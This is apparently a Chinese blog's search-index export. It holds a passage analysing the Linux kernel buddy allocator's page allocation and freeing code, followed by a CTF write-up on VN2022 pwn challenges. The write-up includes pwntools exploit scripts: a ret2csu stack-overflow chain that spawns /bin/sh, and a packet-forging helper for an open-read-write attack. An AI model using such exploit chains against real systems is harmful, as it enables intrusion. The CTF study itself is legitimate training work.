not present in virtual address space\t\t */\t\tif (set_page_guard(zone, &amp;page[size], high, migratetype))\t\t\tcontinue;\t\tadd_to_free_list(&amp;page[size], zone, high, migratetype);\t\tset_buddy_order(&amp;page[size], high);\t&#125;&#125;\n\n在发现current_order大于传入的order时会进入循环，对大的order-1随后将size减半，随后将后半段存入到链表中并设置新的order即这里的high，前半段的page继续重复以上操作直到high == low。\n__alloc_pages_slowpath函数static inline struct page *__alloc_pages_slowpath(gfp_t gfp_mask, unsigned int order,\t\t\t\t\t\tstruct alloc_context *ac)&#123;\tbool can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;\tconst bool costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;\tstruct page *page = NULL;\tunsigned int alloc_flags;\tunsigned long did_some_progress;\tenum compact_priority compact_priority;\tenum compact_result compact_result;\tint compaction_retries;\tint no_progress_loops;\tunsigned int cpuset_mems_cookie;\tunsigned int zonelist_iter_cookie;\tint reserve_flags;restart:\tcompaction_retries = 0;\tno_progress_loops = 0;\tcompact_priority = DEF_COMPACT_PRIORITY;\tcpuset_mems_cookie = read_mems_allowed_begin();\tzonelist_iter_cookie = zonelist_iter_begin();\t/*\t * The fast path uses conservative alloc_flags to succeed only until\t * kswapd needs to be woken up, and to avoid the cost of setting up\t * alloc_flags precisely. So we do that now.\t */\talloc_flags = gfp_to_alloc_flags(gfp_mask, order);\t/*\t * We need to recalculate the starting point for the zonelist iterator\t * because we might have used different nodemask in the fast path, or\t * there was a cpuset modification and we are retrying - otherwise we\t * could end up iterating over non-eligible zones endlessly.\t */\tac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,\t\t\t\t\tac-&gt;highest_zoneidx, ac-&gt;nodemask);\tif (!ac-&gt;preferred_zoneref-&gt;zone)\t\tgoto nopage;\t/*\t * Check for insane configurations where the cpuset doesn&#x27;t contain\t * any suitable zone to satisfy the request - e.g. non-movable\t * GFP_HIGHUSER allocations from MOVABLE nodes only.\t */\tif (cpusets_insane_config() &amp;&amp; (gfp_mask &amp; __GFP_HARDWALL)) &#123;\t\tstruct zoneref *z = first_zones_zonelist(ac-&gt;zonelist,\t\t\t\t\tac-&gt;highest_zoneidx,\t\t\t\t\t&amp;cpuset_current_mems_allowed);\t\tif (!z-&gt;zone)\t\t\tgoto nopage;\t&#125;\tif (alloc_flags &amp; ALLOC_KSWAPD)\t\twake_all_kswapds(order, gfp_mask, ac);\t/*\t * The adjusted alloc_flags might result in immediate success, so try\t * that first\t */\tpage = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);\tif (page)\t\tgoto got_pg;\t/*\t * For costly allocations, try direct compaction first, as it&#x27;s likely\t * that we have enough base pages and don&#x27;t need to reclaim. For non-\t * movable high-order allocations, do that as well, as compaction will\t * try prevent permanent fragmentation by migrating from blocks of the\t * same migratetype.\t * Don&#x27;t try this for allocations that are allowed to ignore\t * watermarks, as the ALLOC_NO_WATERMARKS attempt didn&#x27;t yet happen.\t */\tif (can_direct_reclaim &amp;&amp;\t\t\t(costly_order ||\t\t\t   (order &gt; 0 &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))\t\t\t&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;\t\tpage = __alloc_pages_direct_compact(gfp_mask, order,\t\t\t\t\t\talloc_flags, ac,\t\t\t\t\t\tINIT_COMPACT_PRIORITY,\t\t\t\t\t\t&amp;compact_result);\t\tif (page)\t\t\tgoto got_pg;\t\t/*\t\t * Checks for costly allocations with __GFP_NORETRY, which\t\t * includes some THP page fault allocations\t\t */\t\tif (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;\t\t\t/*\t\t\t * If allocating entire pageblock(s) and compaction\t\t\t * failed because all zones are below low watermarks\t\t\t * or is prohibited because it recently failed at this\t\t\t * order, fail immediately unless the allocator has\t\t\t * requested compaction and reclaim retry.\t\t\t *\t\t\t * Reclaim is\t\t\t *  - potentially very expensive because zones are far\t\t\t *    below their low watermarks or this is part of very\t\t\t *    bursty high order allocations,\t\t\t *  - not guaranteed to help because isolate_freepages()\t\t\t *    may not iterate over freed pages as part of its\t\t\t *    linear scan, and\t\t\t *  - unlikely to make entire pageblocks free on its\t\t\t *    own.\t\t\t */\t\t\tif (compact_result == COMPACT_SKIPPED ||\t\t\t    compact_result == COMPACT_DEFERRED)\t\t\t\tgoto nopage;\t\t\t/*\t\t\t * Looks like reclaim/compaction is worth trying, but\t\t\t * sync compaction could be very expensive, so keep\t\t\t * using async compaction.\t\t\t */\t\t\tcompact_priority = INIT_COMPACT_PRIORITY;\t\t&#125;\t&#125;retry:\t/* Ensure kswapd doesn&#x27;t accidentally go to sleep as long as we loop */\tif (alloc_flags &amp; ALLOC_KSWAPD)\t\twake_all_kswapds(order, gfp_mask, ac);\treserve_flags = __gfp_pfmemalloc_flags(gfp_mask);\tif (reserve_flags)\t\talloc_flags = gfp_to_alloc_flags_cma(gfp_mask, reserve_flags) |\t\t\t\t\t  (alloc_flags &amp; ALLOC_KSWAPD);\t/*\t * Reset the nodemask and zonelist iterators if memory policies can be\t * ignored. These allocations are high priority and system rather than\t * user oriented.\t */\tif (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;\t\tac-&gt;nodemask = NULL;\t\tac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,\t\t\t\t\tac-&gt;highest_zoneidx, ac-&gt;nodemask);\t&#125;\t/* Attempt with potentially adjusted zonelist and alloc_flags */\tpage = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);\tif (page)\t\tgoto got_pg;\t/* Caller is not willing to reclaim, we can&#x27;t balance anything */\tif (!can_direct_reclaim)\t\tgoto nopage;\t/* Avoid recursion of direct reclaim */\tif (current-&gt;flags &amp; PF_MEMALLOC)\t\tgoto nopage;\t/* Try direct reclaim and then allocating */\tpage = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,\t\t\t\t\t\t\t&amp;did_some_progress);\tif (page)\t\tgoto got_pg;\t/* Try direct compaction and then allocating */\tpage = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,\t\t\t\t\tcompact_priority, &amp;compact_result);\tif (page)\t\tgoto got_pg;\t/* Do not loop if specifically requested */\tif (gfp_mask &amp; __GFP_NORETRY)\t\tgoto nopage;\t/*\t * Do not retry costly high order allocations unless they are\t * __GFP_RETRY_MAYFAIL\t */\tif (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))\t\tgoto nopage;\tif (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,\t\t\t\t did_some_progress &gt; 0, &amp;no_progress_loops))\t\tgoto retry;\t/*\t * It doesn&#x27;t make any sense to retry for the compaction if the order-0\t * reclaim is not able to make any progress because the current\t * implementation of the compaction depends on the sufficient amount\t * of free memory (see __compaction_suitable)\t */\tif (did_some_progress &gt; 0 &amp;&amp;\t\t\tshould_compact_retry(ac, order, alloc_flags,\t\t\t\tcompact_result, &amp;compact_priority,\t\t\t\t&amp;compaction_retries))\t\tgoto retry;\t/*\t * Deal with possible cpuset update races or zonelist updates to avoid\t * a unnecessary OOM kill.\t */\tif (check_retry_cpuset(cpuset_mems_cookie, ac) ||\t    check_retry_zonelist(zonelist_iter_cookie))\t\tgoto restart;\t/* Reclaim has failed us, start killing things */\tpage = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);\tif (page)\t\tgoto got_pg;\t/* Avoid allocations with no watermarks from looping endlessly */\tif (tsk_is_oom_victim(current) &amp;&amp;\t    (alloc_flags &amp; ALLOC_OOM ||\t     (gfp_mask &amp; __GFP_NOMEMALLOC)))\t\tgoto nopage;\t/* Retry as long as the OOM killer is making progress */\tif (did_some_progress) &#123;\t\tno_progress_loops = 0;\t\tgoto retry;\t&#125;nopage:\t/*\t * Deal with possible cpuset update races or zonelist updates to avoid\t * a unnecessary OOM kill.\t */\tif (check_retry_cpuset(cpuset_mems_cookie, ac) ||\t    check_retry_zonelist(zonelist_iter_cookie))\t\tgoto restart;\t/*\t * Make sure that __GFP_NOFAIL request doesn&#x27;t leak out and make sure\t * we always retry\t */\tif (gfp_mask &amp; __GFP_NOFAIL) &#123;\t\t/*\t\t * All existing users of the __GFP_NOFAIL are blockable, so warn\t\t * of any new users that actually require GFP_NOWAIT\t\t */\t\tif (WARN_ON_ONCE_GFP(!can_direct_reclaim, gfp_mask))\t\t\tgoto fail;\t\t/*\t\t * PF_MEMALLOC request from this context is rather bizarre\t\t * because we cannot reclaim anything and only can loop waiting\t\t * for somebody to do a work for us\t\t */\t\tWARN_ON_ONCE_GFP(current-&gt;flags &amp; PF_MEMALLOC, gfp_mask);\t\t/*\t\t * non failing costly orders are a hard requirement which we\t\t * are not prepared for much so let&#x27;s warn about these users\t\t * so that we can identify them and convert them to something\t\t * else.\t\t */\t\tWARN_ON_ONCE_GFP(costly_order, gfp_mask);\t\t/*\t\t * Help non-failing allocations by giving some access to memory\t\t * reserves normally used for high priority non-blocking\t\t * allocations but do not use ALLOC_NO_WATERMARKS because this\t\t * could deplete whole memory reserves which would just make\t\t * the situation worse.\t\t */\t\tpage = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_MIN_RESERVE, ac);\t\tif (page)\t\t\tgoto got_pg;\t\tcond_resched();\t\tgoto retry;\t&#125;fail:\twarn_alloc(gfp_mask, ac-&gt;nodemask,\t\t\t&quot;page allocation failure: order:%u&quot;, order);got_pg:\treturn page;&#125;\n\n相信各位都在操作系统课程上学习过页迁移机制，在这里也简单说一下内核中的Memory compaction机制，就是整理内存碎片，对零散的内存页进行迁移，从而将零散的空闲内存页变成大块的空闲内存，不过这里只整理可以移动的碎片。\n\n现在开始分析一下整个函数的流程吧，首先使用原有的 gfp_flag 重新设置 alloc_flag，并重新计算preferred zone，若设置了 ALLOC_KSWAPD 则调用 wake_all_kswapds() 唤醒 kswapd 线程进行内存回收。\n随后直接重新尝试快速路径分配，如果成功则直接返回。\n接下来调用 __alloc_pages_direct_compact() 进行compaction，该函数内部在整理完后会重新尝试快速路径的分配，若成功则直接返回。\n随后进入retry分支调用 wake_all_kswapds() 唤醒 kswapd 线程进行内存回收。\n调整 zonelist 与alloc_flag，之后再次尝试快速路径分配，若成功则直接返回。\n若 gfp_flag 中没有 __GFP_DIRECT_RECLAIM 或是进程 PCB 的 flag 中有 PF_MEMALLOC，直接跳转到nopage分支。\n随后调用 __alloc_pages_direct_reclaim() 进行内存回收（内部调用 __perform_reclaim()）与快速路径分配，若成功则直接返回。\n然后调用 __alloc_pages_direct_compact() 进行 compaction 与快速路径分配，若成功则直接返回。\n如果设置了 __GFP_NORETRY ，或是该次内存分配开销较高（order &gt; PAGE_ALLOC_COSTLY_ORDER）且未设置 __GFP_RETRY_MAYFAIL，直接跳到nopage标签。\n调用 should_reclaim_retry() 判断是否需要重新回收，若是则跳回retry标签。\n调用 should_compact_retry() 判断是否需要重新进行 compaction，若是则跳回retry标签。\n调用 check_retry_cpuset() 检查 cpuset 是否发生变化，若是则跳转回开头即restart标签。\n在前面的检测都没跳转则调用 __alloc_pages_may_oom() 尝试 kill 一些进程来释放内存，该函数内首先还是会先进行一次快速分配，之后才是调用 out_of_memory() 来杀掉最适合的进程以释放内存，最后若设置了 __GFP_NOFAIL 则调用 __alloc_pages_cpuset_fallback() 再次尝试内存分配。\nstatic inline struct page *__alloc_pages_cpuset_fallback(gfp_t gfp_mask, unsigned int order,\t\t\t      unsigned int alloc_flags,\t\t\t      const struct alloc_context *ac)&#123;\tstruct page *page;\tpage = get_page_from_freelist(gfp_mask, order,\t\t\talloc_flags|ALLOC_CPUSET, ac);\t/*\t * fallback to ignore cpuset restriction if our nodes\t * are depleted\t */\tif (!page)\t\tpage = get_page_from_freelist(gfp_mask, order,\t\t\t\talloc_flags, ac);\treturn page;&#125;\n\n该函数中会两次走快速路径进行分配，在第一次会额外附加上 ALLOC_CPUSET 的 flag。\n继续看__alloc_pages_slowpath函数流程，如果把当前进程杀掉了，跳到nopage标签，如果杀进程取得了成效，跳回retry标签。\n最后进入nopage标签调用 check_retry_cpuset() 检查 cpuset 是否发生变化，若是则跳转回开头即restart标签。\n若设置了 __GFP_NOFAIL 则进行一系列的警告，并调用 __alloc_pages_cpuset_fallback() 再次尝试内存分配，若未成功则跳回retry标签。最后就是返回结果了。\n\n上面是偷的图，其实通过图能够更清晰的理清楚slow path的逻辑。\n上层封装的分配函数static inline struct page *__alloc_pages_node(int nid, gfp_t gfp_mask, unsigned int order)&#123;\tVM_BUG_ON(nid &lt; 0 || nid &gt;= MAX_NUMNODES);\twarn_if_node_offline(nid, gfp_mask);\treturn __alloc_pages(gfp_mask, order, nid, NULL);&#125;static inline struct page *alloc_pages_node(int nid, gfp_t gfp_mask,\t\t\t\t\t\tunsigned int order)&#123;\tif (nid == NUMA_NO_NODE)\t\tnid = numa_mem_id();\treturn __alloc_pages_node(nid, gfp_mask, order);&#125;static inline struct page *alloc_pages(gfp_t gfp_mask, unsigned int order)&#123;\treturn alloc_pages_node(numa_node_id(), gfp_mask, order);&#125;unsigned long __get_free_pages(gfp_t gfp_mask, unsigned int order)&#123;\tstruct page *page;\tpage = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);\tif (!page)\t\treturn 0;\treturn (unsigned long) page_address(page);&#125;EXPORT_SYMBOL(__get_free_pages);\n\n在__alloc_pages上层有这样一些分配函数，只不过返回的内容不一样，在__get_free_pages函数返回的是虚拟地址，alloc_pages函数返回的是page结构体指针。\n__free_one_page函数/* * Freeing function for a buddy system allocator. * * The concept of a buddy system is to maintain direct-mapped table * (containing bit values) for memory blocks of various &quot;orders&quot;. * The bottom level table contains the map for the smallest allocatable * units of memory (here, pages), and each level above it describes * pairs of units from the levels below, hence, &quot;buddies&quot;. * At a high level, all that happens here is marking the table entry * at the bottom level available, and propagating the changes upward * as necessary, plus some accounting needed to play nicely with other * parts of the VM system. * At each level, we keep a list of pages, which are heads of continuous * free pages of length of (1 &lt;&lt; order) and marked with PageBuddy. * Page&#x27;s order is recorded in page_private(page) field. * So when we are allocating or freeing one, we can derive the state of the * other.  That is, if we allocate a small block, and both were * free, the remainder of the region must be split into blocks. * If a block is freed, and its buddy is also free, then this * triggers coalescing into a block of larger size. * * -- nyc */static inline void __free_one_page(struct page *page,\t\tunsigned long pfn,\t\tstruct zone *zone, unsigned int order,\t\tint migratetype, fpi_t fpi_flags)&#123;\tstruct capture_control *capc = task_capc(zone);\tunsigned long buddy_pfn = 0;\tunsigned long combined_pfn;\tstruct page *buddy;\tbool to_tail;\tVM_BUG_ON(!zone_is_initialized(zone));\tVM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);\tVM_BUG_ON(migratetype == -1);\tif (likely(!is_migrate_isolate(migratetype)))\t\t__mod_zone_freepage_state(zone, 1 &lt;&lt; order, migratetype);\tVM_BUG_ON_PAGE(pfn &amp; ((1 &lt;&lt; order) - 1), page);\tVM_BUG_ON_PAGE(bad_range(zone, page), page);\twhile (order &lt; MAX_ORDER) &#123;\t\tif (compaction_capture(capc, page, order, migratetype)) &#123;\t\t\t__mod_zone_freepage_state(zone, -(1 &lt;&lt; order),\t\t\t\t\t\t\t\tmigratetype);\t\t\treturn;\t\t&#125;\t\tbuddy = find_buddy_page_pfn(page, pfn, order, &amp;buddy_pfn);\t\tif (!buddy)\t\t\tgoto done_merging;\t\tif (unlikely(order &gt;= pageblock_order)) &#123;\t\t\t/*\t\t\t * We want to prevent merge between freepages on pageblock\t\t\t * without fallbacks and normal pageblock. Without this,\t\t\t * pageblock isolation could cause incorrect freepage or CMA\t\t\t * accounting or HIGHATOMIC accounting.\t\t\t */\t\t\tint buddy_mt = get_pfnblock_migratetype(buddy, buddy_pfn);\t\t\tif (migratetype != buddy_mt\t\t\t\t\t&amp;&amp; (!migratetype_is_mergeable(migratetype) ||\t\t\t\t\t\t!migratetype_is_mergeable(buddy_mt)))\t\t\t\tgoto done_merging;\t\t&#125;\t\t/*\t\t * Our buddy is free or it is CONFIG_DEBUG_PAGEALLOC guard page,\t\t * merge with it and move up one order.\t\t */\t\tif (page_is_guard(buddy))\t\t\tclear_page_guard(zone, buddy, order, migratetype);\t\telse\t\t\tdel_page_from_free_list(buddy, zone, order);\t\tcombined_pfn = buddy_pfn &amp; pfn;\t\tpage = page + (combined_pfn - pfn);\t\tpfn = combined_pfn;\t\torder++;\t&#125;done_merging:\tset_buddy_order(page, order);\tif (fpi_flags &amp; FPI_TO_TAIL)\t\tto_tail = true;\telse if (is_shuffle_order(order))\t\tto_tail = shuffle_pick_tail();\telse\t\tto_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);\tif (to_tail)\t\tadd_to_free_list_tail(page, zone, order, migratetype);\telse\t\tadd_to_free_list(page, zone, order, migratetype);\t/* Notify page reporting subsystem of freed page */\tif (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))\t\tpage_reporting_notify_free(order);&#125;\n\n该函数，主要作用是将特定页面释放到特定 zone 上，需要注意的是这里的 one page 不是一张页框而是一块连续内存（可能有多张页）。这是一个释放页面的基本函数，故我们需要提供待释放页面的页结构体（struct page）、页框号、页面块的阶（order）、目标 zone、迁移类型等信息——这些信息通常由上层封装函数提供，这个函数所做的只是简单地将页挂回对应链表并检查合并的操作。该函数是 buddy system 中用以进行页面释放的核心函数，所有的页面释放 API 都是基于该函数的封装。\n我们将与待释放页面凑成一对的内存块称为 buddy，所谓凑成一对便是这两个内存块在物理上连续，且能凑成一个更高一阶的大内存块，由此称之为一对 buddies。\n接下来开始分析一下这个函数的基本流程：\n首先这里通过find_buddy_page_pfn函数寻找并检查buddy。\nstatic inline struct page *find_buddy_page_pfn(struct page *page,\t\t\tunsigned long pfn, unsigned int order, unsigned long *buddy_pfn)&#123;\tunsigned long __buddy_pfn = __find_buddy_pfn(pfn, order);\tstruct page *buddy;\tbuddy = page + (__buddy_pfn - pfn);\tif (buddy_pfn)\t\t*buddy_pfn = __buddy_pfn;\tif (page_is_buddy(page, buddy, order))\t\treturn buddy;\treturn NULL;&#125;\n\n首先会根据待释放堆块的pfn和order寻找到buddy的pfn，随后通过计算或得到buddy的page指针，随后调用page_is_buddy来判断是否满足buddy条件。主要是以下四个条件：\n\n  buddy 不在空洞中\n  buddy 在 buddy system 中（即 buddy 也是空闲内存块）\n  待释放页面与其 buddy 在同一个 zone 中\n  待释放页面与其 buddy 有着同样的阶（order）\n\n随后进行判断如果order达到了pageblock_order那么就意味着常规的pageblock可能会与独立的pageblock进行合并，为了预防这一现象，内核在这里存在一处判断，即if (unlikely(order &gt;= pageblock_order)) &#123;这里会判断所选择的buddy是否为mergeable，如果是可以继续增加order，如果不是则直接进入到done_merging标签。\n循环最后验证此buddy 是否为 guard page，如果是则调用 clear_page_guard() 清除这个属性让其变成空闲页面，这里清除的操作是通过将 page 结构体的 private 字段置 0 实现的；若否，则说明是常规的空闲页面，调用 del_page_from_free_list() 将其脱链。\n经过前面的操作后我们的新的高阶内存块就完成合成了，接下来我们回到循环开头重新寻找这个合成的新内存块的 buddy，这个循环一直持续到 max_order （一般是10），作为下一次循环的页框号的计算方式是 buddy_pfn &amp; pfn，之后做指针运算 page + (combined_pfn - pfn) 找到对应的 page 结构体。\n最后进入到done_merging标签，这一步主要是调用 set_buddy_order() 在 page 结构体的 private 字段存放该内存块的 order，若是设置了 FPI_TO_TAIL flag，则将 to_tail 置为 true；否则，若内存块的 order &gt;= SHUFFLE_ORDER（MAX_ORDER - 1），则将 to_tail 置为随机结果（shuffle_pick_tail()）；否则置为调用 buddy_merge_likely() 的结果，该函数会检查是否下一个最高阶的 buddy 是否空闲，若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部，这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面。若 to_tail 为真，则调用 add_to_free_list_tail() 将该空闲页添加到链表末尾，否则调用 add_to_free_list() 添加到链表开头。\n上层封装的释放函数static void __free_pages_ok(struct page *page, unsigned int order,\t\t\t    fpi_t fpi_flags)&#123;\tunsigned long flags;\tint migratetype;\tunsigned long pfn = page_to_pfn(page);\tstruct zone *zone = page_zone(page);\tif (!free_pages_prepare(page, order, fpi_flags))\t\treturn;\t/*\t * Calling get_pfnblock_migratetype() without spin_lock_irqsave() here\t * is used to avoid calling get_pfnblock_migratetype() under the lock.\t * This will reduce the lock holding time.\t */\tmigratetype = get_pfnblock_migratetype(page, pfn);\tspin_lock_irqsave(&amp;zone-&gt;lock, flags);\tif (unlikely(has_isolate_pageblock(zone) ||\t\tis_migrate_isolate(migratetype))) &#123;\t\tmigratetype = get_pfnblock_migratetype(page, pfn);\t&#125;\t__free_one_page(page, pfn, zone, order, migratetype, fpi_flags);\tspin_unlock_irqrestore(&amp;zone-&gt;lock, flags);\t__count_vm_events(PGFREE, 1 &lt;&lt; order);&#125;static inline void free_the_page(struct page *page, unsigned int order)&#123;\tif (pcp_allowed_order(order))\t\t/* Via pcp? */\t\tfree_unref_page(page, order);\telse\t\t__free_pages_ok(page, order, FPI_NONE);&#125;void __free_pages(struct page *page, unsigned int order)&#123;\t/* get PageHead before we drop reference */\tint head = PageHead(page);\tif (put_page_testzero(page))\t\tfree_the_page(page, order);\telse if (!head)\t\twhile (order-- &gt; 0)\t\t\tfree_the_page(page + (1 &lt;&lt; order), order);&#125;EXPORT_SYMBOL(__free_pages);void free_pages(unsigned long addr, unsigned int order)&#123;\tif (addr != 0) &#123;\t\tVM_BUG_ON(!virt_addr_valid((void *)addr));\t\t__free_pages(virt_to_page((void *)addr), order);\t&#125;&#125;EXPORT_SYMBOL(free_pages);\n\n所有页面释放的函数其实都是对 __free_one_page() 的封装，最终都会调用到这个函数，前面是其中一条路的路径。\n后记🙏🙏🙏，这段时间实在是过于懒狗了，这是一篇2023年11月29号创建的文章，一直拖到今天才写完并发出来，虽然这段时间确实时不时会有一些事不过也不会耽误太多时间，说到底是我犯懒有时间不想写，其实就算晚上去玩游戏也是能早早写完了的，不做懒狗了！\n后续关于syzkaller的文章可能会缓一段时间再继续写了，因为自己的fuzz基础其实不是很扎实，所以我打算先去学学怎样自己去实现一个fuzz再去看，如果直接看就算把逻辑理清楚了也没法自己动手改进之类的。\n所以后续的更新大概率是Linux Rootkit，用户态fuzz实现，从0开始写操作系统等。\n","categories":["Linux Kernel"],"tags":["buddy system","内存管理"]},{"title":"VN2022复现[1]","url":"/2022/02/14/VN2022%E5%A4%8D%E7%8E%B0/","content":"首先反思一下，整场比赛我只看了HideOnHeap和classic_httpd这两道题(因为在最开始的时候这两道题是排在最前面的)。发现毫无思路我就直接开始摆烂了，后面的pwn题也是一道没看，甚至都没下载下来。 拒绝摆烂，从你我做起！\nclear_got这个题目就是一个非常简单的栈溢出，咋一看以为是SROP实际上就是非常基础的ROP即可(愈发觉得自己摆烂不是人了)。\n题目分析int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[92]; // [rsp+0h] [rbp-60h] BYREF  int v5; // [rsp+5Ch] [rbp-4h]  init(argc, argv, envp);  memset(buf, 0, 0x50uLL);  puts(&quot;Welcome to VNCTF! This is a easy competition.///&quot;);  read(0, buf, 0x100uLL);  v5 = (int)&amp;qword_601008;  memset(&amp;qword_601008, 0, 0x38uLL);  return 0;&#125;\n\n可以看到存在一处栈溢出，然后下面将got表全部清空，但是题目给了两个用syscall直接调用的函数，所以我的第一反应就是SROP，不过WP的方法感觉更为简单，就是ret2csu即可。\nfrom pwn import *elf = ELF(&#x27;./clear_got&#x27;)r = process(&#x27;./clear_got&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;bss = elf.bss()+0x20syscall_ret = 0x40077Epayload = b&#x27;a&#x27;*(0x60+0x8)+p64(0x4007EA)+p64(0xc01c8) + \\    p64(0xc01c9)+p64(0)+p64(59)+p64(bss)+p64(0)payload += p64(0x4007D0)+p64(0)+p64((bss+8)//8)+p64((bss+8)//8+1) + \\    p64(0)*3+p64(bss)+p64(syscall_ret)+p64(0x4007D0)payload = payload.ljust(0x100, b&#x27;a&#x27;)info(&#x27;bss=&gt;&#x27;+hex(bss))# gdb.attach(r)r.send(payload)payload = b&#x27;/bin/sh\\x00&#x27;+p64(syscall_ret)payload = payload.ljust(59, b&#x27;\\x00&#x27;)r.sendline(payload)r.interactive()\n\n这里比较巧妙的一点就是在最后到0x4007D0这个地址时其实是用call了那个syscall来实现调用的。\neasyROPtocol这道题目的难度也不是很大，关键是把结构体搞清楚就好(真是越看越想打自己)。\n题目分析struct tcp&#123;    0x766e; // size=2    0x28b7; // size=2    0xn001; // size=4    0x1;    // size=4    0x6;    // size=2    0x1;\t// size=2\t\t\t// size=2    0x0;\t// size=2    0x1;\t// size=2    0xffff; // size=2&#125;\n\n最后推出来的结构体\nssize_t sub_401830()&#123;  const void *v0; // rbx  size_t v1; // rax  size_t v2; // rax  char s[24]; // [rsp+0h] [rbp-3020h] BYREF  int i; // [rsp+3008h] [rbp-18h]  int v6; // [rsp+300Ch] [rbp-14h]  v6 = 1;  memset(s, 0, 0x3000uLL);  while ( dword_40422C )  &#123;    for ( i = 0; i &lt;= 3 &amp;&amp; (!chunk_arr[i] || *(chunk_arr[i] + 4LL) != v6); ++i )      ;    if ( i == 4 )      break;    if ( 4 * (*(chunk_arr[i] + 12LL) &amp; 0xF) != 20 &amp;&amp; *(chunk_arr[i] + 20LL) )    &#123;      v0 = (chunk_arr[i] + 4 * (*(chunk_arr[i] + 12LL) &amp; 0xF));      v1 = strlen(s);      memcpy(&amp;s[v1], v0, 0x1000uLL);      v6 += 4096;    &#125;    else    &#123;      strcpy(s, (4 * (*(chunk_arr[i] + 12LL) &amp; 0xF) + chunk_arr[i]));      dword_40422C = 0;    &#125;  &#125;  v2 = strlen(s);  write(1, s, v2);  return write(1, &quot;Done.\\n&quot;, 6uLL);&#125;\n\n首先是看漏洞函数，这里存在一处栈溢出，memcpy(&amp;s[v1], v0, 0x1000uLL);但是要实现需要满足上面的条件，这就必须要去搞清楚结构体了。\nvoid sub_40164F()&#123;  size_t v0; // rax  int v1; // [rsp+8h] [rbp-8h]  int i; // [rsp+Ch] [rbp-4h]  for ( i = 0; i &lt;= 3 &amp;&amp; *(&amp;chunk_arr + i); ++i )    ;  if ( i != 4 )  &#123;    *(&amp;chunk_arr + i) = malloc(0x1000uLL);    read(0, *(&amp;chunk_arr + i), 0x1000uLL);    v1 = sub_4014AF(*(&amp;chunk_arr + i));    if ( (sub_401590(*(&amp;chunk_arr + i)) &amp; v1) == 1 )    &#123;      dword_40422C = 1;    &#125;    else    &#123;      v0 = strlen(aBengBuZhuLe);      write(2, aBengBuZhuLe, v0);      free(*(&amp;chunk_arr + i));      *(&amp;chunk_arr + i) = 0LL;    &#125;  &#125;&#125;\n\n想要成功创建出结构体就必须要通过那个if语句，也就是v1和前面的sub_401590(*(&amp;chunk_arr + i)都为1。\n__int64 __fastcall sub_4014AF(__int64 a1)&#123;  __int64 result; // rax  if ( *a1 != 0x766E )    return 0LL;  if ( *(a1 + 2) != 0x28B7 )    return 0LL;  if ( !*(a1 + 4) )    return 0LL;  if ( !*(a1 + 8) )    return 0LL;  if ( !*(a1 + 14) )    return 0LL;  if ( *(a1 + 18) )    return 0LL;  if ( 4 * (*(a1 + 12) &amp; 0xF) == 20 )    goto LABEL_18;  if ( 4 * (*(a1 + 12) &amp; 0xF) != 24 )    return 0LL;  if ( *(a1 + 22) == 0xFFFF )LABEL_18:    result = 1LL;  else    result = 0LL;  return result;&#125;\n\n_BOOL8 __fastcall sub_401590(__int64 a1)&#123;  char v2[23]; // [rsp+Bh] [rbp-1Dh] BYREF  unsigned __int16 j; // [rsp+22h] [rbp-6h]  unsigned __int16 i; // [rsp+24h] [rbp-4h]  __int16 v5; // [rsp+26h] [rbp-2h]  strcpy(v2, &quot;fakeipheadfa&quot;);  *&amp;v2[13] = v2;  v5 = 0;  for ( i = 0; i &lt;= 5u; ++i )    v5 ^= *(2LL * i + *&amp;v2[13]);  *&amp;v2[13] = a1;  for ( j = 0; j &lt;= 0x7FFu; ++j )  &#123;    if ( j != 8 )      v5 ^= *(2LL * j + *&amp;v2[13]);  &#125;  return v5 == *(a1 + 16);&#125;\n\n很容易就可以推出来结构体(下面这个函数当中是当j!=8我一直以为是chunk_addr+8，结果卡了半个小时发现是2*j(我是傻逼)\n程序开启了沙箱所以使用orw即可\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;def package(addr_4, content):    pack = p16(0x766e)    pack += p16(0x28b7)    pack += p32(addr_4)    pack += p32(0x1)    pack += p16(0x6)    pack += p16(0x1)    pack += p16(0x0)    pack += p16(0x0)    pack += p16(0x1)    pack += p16(0xffff)+content    v2 = &#x27;fakeipheadfa&#x27;    v5 = 0    for i in range(6):        v5 = v5 ^ int(hex(ord(v2[:2][::-1][0])) +                      hex(ord(v2[:2][::-1][1]))[2:], 16)        v2 = v2[2:]    a1 = pack    for i in range(0x800):        v5 = v5 ^ u16(a1[:2])        a1 = a1[2:]    pack = pack[:16]+p16(v5)+pack[18:]    return packdef create(content):    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;1&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;2&#x27;)    